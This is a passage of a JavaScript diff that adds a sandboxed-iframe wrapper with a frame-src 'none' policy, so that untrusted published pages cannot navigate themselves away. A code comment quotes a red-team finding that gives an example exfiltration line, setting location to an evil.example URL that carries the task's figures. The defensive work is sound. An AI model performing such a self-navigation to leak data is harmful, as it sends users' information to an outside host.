@@ -13,6 +13,14 @@ export const lockDown = (html) => {
   const m = /^\s*<!doctype[^>]*>/i.exec(html || "");
   return m ? m[0] + meta + html.slice(m[0].length) : meta + (html || "");
 };
+// ...AND NOWHERE TO GO (the red team, 2026-11-24, T8a): a page may still navigate ITSELF - location = "https://evil.example/?d=<the task's
+// figures>", with no click - and nothing in its own policy stops that. Its frame's PARENT's frame-src does, so the page is drawn inside a
+// frame of its own whose one rule is frame-src 'none' (a srcdoc frame takes on its parent's policy too, so the page's scripts run as before)
+export const SANDBOX = "allow-scripts allow-popups allow-popups-to-escape-sandbox";
+const attr = (s) => String(s).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
+export const shut = (html) => `<!doctype html><meta http-equiv="Content-Security-Policy" content="frame-src 'none'">`
+  + `<style>html,body{margin:0;height:100%;overflow:hidden}iframe{border:0;width:100%;height:100%;display:block}</style>`
+  + `<iframe sandbox="${SANDBOX}" srcdoc="${attr(lockDown(html))}"></iframe>`;
 // A WIDE PICTURE FITS ITS FRAME (the stress test, 2026-11-02): an SVG goes through the page frame (PublishedPages.isPicture) and drew at its
 // own width - 1600 across a 600 frame scrolled sideways. Shrunk to the frame's width, its height following; a fixed width and height with no
 // viewBox would only crop, so they become its viewBox. The file's own prolog (<?xml ?>, its DOCTYPE) is dropped for the page's
